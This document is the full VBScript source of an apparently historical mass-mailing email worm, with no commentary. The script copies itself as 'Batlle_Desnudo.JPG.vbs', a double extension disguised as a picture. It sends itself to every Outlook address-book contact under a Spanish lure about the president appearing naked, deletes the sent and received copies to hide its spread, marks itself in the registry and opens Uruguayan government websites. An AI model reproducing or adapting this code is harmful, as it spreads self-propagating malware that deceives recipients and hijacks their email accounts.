On Error Resume Next
Set j=CreateObject("WScript.Shell")
Set F=CreateObject("scripting.filesystemobject")
C=F.GetSpecialFolder(2)
Set Ik=F.OpenTextFile(WScript.ScriptFullname, 1)
Do While Ik.AtEndOfStream <> True
SptT=SptT&Ik.ReadLine&vbCrLf
Loop
Set OF=F.OpenTextFile(C&"\Batlle_Desnudo.JPG.vbs",2,True)
OF.write SptT
OF.Close
Set F=Nothing
If j.regread("HKEY_CURRENT_USER\software\Batlle\mailed") <> "1" Then
If j.regread("HKCU\software\Batlle\mailed") <> "1" Then
Env()
End If
End If
Set s=CreateObject("Outlook.Application")
Set t=s.GetNameSpace("MAPI")
Set u=t.GetDefaultFolder(6)
For i=1 To u.Items.Count
If u.Items.Item(i).Subject="NUEVAS MEDIDAS DEL EJECUTIVO" Then
u.Items.Item(i).Close
u.Items.Item(i).Delete
End If
Next
Set u=t.GetDefaultFolder(3)
For i=1 To u.Items.Count
If u.Items.Item(i).Subject="NUEVAS MEDIDAS DEL EJECUTIVO" Then
u.Items.Item(i).Delete
End If
Next
Randomize
r=Int((2 * Rnd) + 1)
If r=1 Then
j.Run ("http://www.presidencia.gub.uy")
ElseIf r=2 Then
j.Run ("http://www.parlamento.gub.uy")
End If

Function Env()
On Error Resume Next
Set Otk=CreateObject("Outlook.Application")
If Otk="Outlook" Then
Set Mpi=Otk.GetNameSpace("MAPI")
Set Lst=Mpi.AddressLists
For Each Lstdx In Lst
If Lstdx.AddressEntries.Count <> 0 Then
CCnt=Lstdx.AddressEntries.Count
For Cnt=1 To CCnt
Set Ml=Otk.CreateItem(0)
Set Ctct=Lstdx.AddressEntries(Cnt)
Ml.To=Ctct.Address
Ml.Subject="NUEVAS MEDIDAS DEL EJECUTIVO"
Ml.Body=vbCrLf&"Lo que nos faltaba:"&vbCrLf&vbCrLf&" Batlle se desnuda para combatir la aftosa !!" &vbCrLf&"Tenés que verlo, es impresionante!"&vbCrLf
Set Atcht=Ml.Attachments
Atcht.Add C&"\Batlle_Desnudo.JPG.vbs"
Ml.DeleteAfterSubmit=True
If Ml.To <> "" Then
Ml.Send
j.regwrite "HKCU\software\Batlle\mailed","1"
j.regwrite "HKEY_CURRENT_USER\software\Batlle\mailed","1"
End If
Next
End If
Next
End If
End Function
